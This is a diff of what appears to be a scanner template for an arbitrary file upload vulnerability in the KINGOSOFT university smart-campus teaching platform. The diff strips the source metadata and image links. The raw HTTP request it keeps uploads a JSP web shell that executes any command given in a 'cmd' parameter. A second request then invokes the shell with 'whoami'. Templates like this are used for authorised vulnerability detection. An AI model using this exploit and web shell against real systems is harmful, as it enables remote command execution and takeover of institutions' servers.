@@ -3,12 +3,8 @@ info:
   name: KINGOSOFT高校智慧校园教学综合服务平台 uploadfile 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qz0gdwdeuzsvup7m'
+  description: ''
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qz0gdwdeuzsvup7m
-    fofa: app="KINGOSOFT高校智慧校园教学综合服务平台"
 http:
 - raw:
   - 'POST /kyfw/frame/sbxm.sbxm.uploadfile.jsp HTTP/1.1
@@ -35,11 +31,9 @@ http:
 
     <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 
-    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760933329368-c6fedd8b-6d4e-4ab8-9109-484b9d968931.png)GET /source/uploadfile/1760674387210.jsp?cmd=whoami HTTP/1.1
+    ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--GET /source/uploadfile/1760674387210.jsp?cmd=whoami HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1760933329616-f1f152ce-7cad-4a6f-8365-66f4b7a604be.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
